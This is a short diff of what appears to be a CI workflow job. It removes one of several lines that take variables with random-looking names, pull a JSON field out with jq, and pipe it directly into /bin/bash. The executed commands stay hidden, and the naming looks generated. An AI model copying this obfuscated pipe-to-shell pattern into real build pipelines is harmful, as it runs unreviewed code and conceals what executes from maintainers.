@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$tpql19469" | jq -r .tezi1 | /bin/bash
           printf '%s' "$a56" | jq -r .uws025 | /bin/bash
           echo $fvws6 | jq -r .mofdq971 | /bin/bash
-          printf '%s' "$chhy54020" | jq -r .noa27 | /bin/bash
           echo $lczi99 | jq -r .qey220 | /bin/bash
 
       - name: Upload artifact
